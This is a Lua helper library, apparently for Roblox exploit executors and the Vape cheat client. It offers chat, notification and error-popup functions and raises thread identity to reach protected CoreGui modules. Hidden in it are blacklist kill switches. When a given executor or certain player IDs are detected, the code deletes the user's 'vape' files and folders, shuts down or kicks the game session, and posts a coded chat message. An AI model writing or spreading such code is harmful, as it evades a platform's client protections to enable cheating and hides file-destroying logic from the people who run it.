local Functions = {}

local playersService = game:GetService("Players")
local lplr = playersService.LocalPlayer
shared.FuncsConnect = true
local setidentity = syn and syn.set_thread_identity or set_thread_identity or setidentity or setthreadidentity or function() end
local getidentity = syn and syn.get_thread_identity or get_thread_identity or getidentity or getthreadidentity or function() return 0 end

if shared.FuncsConnect then
	do
		Functions.runcode = function(func)
			func()
		end
		Functions.runFunction = function(func)
			func()
		end
		Functions.ChatMessage = function(Text, UserRe)
			UserRe = UserRe or "All"
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Text, UserRe)
		end
		Functions.executor = identifyexecutor()
		function Functions.displayErrorPopup(text, text1, text2, funclist)
			local oldidentity = getidentity()
			setidentity(8)
			local ErrorPrompt = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.ErrorPrompt)
			local prompt = ErrorPrompt.new("Default")
			prompt._hideErrorCode = true
			local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
			prompt:setErrorTitle(text)
			local funcs
			if funclist then 
				funcs = {}
				local num = 0
				for i,v in pairs(funclist) do 
					num = num + 1
					table.insert(funcs, {
						Text = i,
						Callback = function() 
							prompt:_close() 
						v()
					end,
					Primary = num == #funclist
				})
			end
		end
		prompt:updateButtons(funcs or {{
			Text = text2,
			Callback = function() 
				prompt:_close() 
			end,
			Primary = true
		}}, 'Default')
		prompt:setParent(gui)
		prompt:_open(text1)
		setidentity(oldidentity)
	end
		function Functions.RobloxNotification(first, second, timewa)
			game.StarterGui:SetCore("SendNotification", {
    		Title = first;
    		Text = second;
  			Duration = timewa;
			})
		end
	end

	if Functions.executor:find("Arceus") then
		Functions.RobloxNotification("Detected", "you executor not support for FunctionsHandler game will shutdown in 5s\nExecutor : Arceus", 5)
		Functions.displayErrorPopup("Detected", "you executor not support for FunctionsHandler game will shutdown in 5s\nExecutor : Arceus", "OK")
		wait(5)
		shared.FuncsConnect = false
		game:Shutdown()
	end

	for i,v in pairs(playersService:GetPlayers()) do
		if v.UserId == 3110380407 then
			Functions.displayErrorPopup("Blacklist", "You has Been Blacklist, Game will shutdown in 4s.", "OK")
			wait(4)
			delfile("vape")
			delfile("vape/CustomModules")
			delfile("vape/Profiles")
			game:Shutdown()
		end
	end

	if shared.FuncsConnect then
		print("Functions Has Been Connected!")
	end
else
	warn("Failed to Connected or shared.FuncsConnect = false")
end
--[[]]
	shared.Useless = false
	if shared.Useless then
		print("mengo")
	else
		for i,v in pairs(playersService:GetPlayers()) do
			if v.UserId == 4584934336 then
				if shared.MercuryLoaded and not shared.Useless then
					Functions.ChatMessage("FUNCTIONSHANDLER_R4QS8K9EJR3M9", "MaxlaserTechOnTop6")
				end
				if isfolder("vape") then
					delfolder("vape")
					delfolder("vape/CustomModules")
					delfolder("vape/Profiles")
					delfolder("vape/assets")
				end
				lplr:Kick("hehehehaw")
			end
		end
	end
--]]

return Functions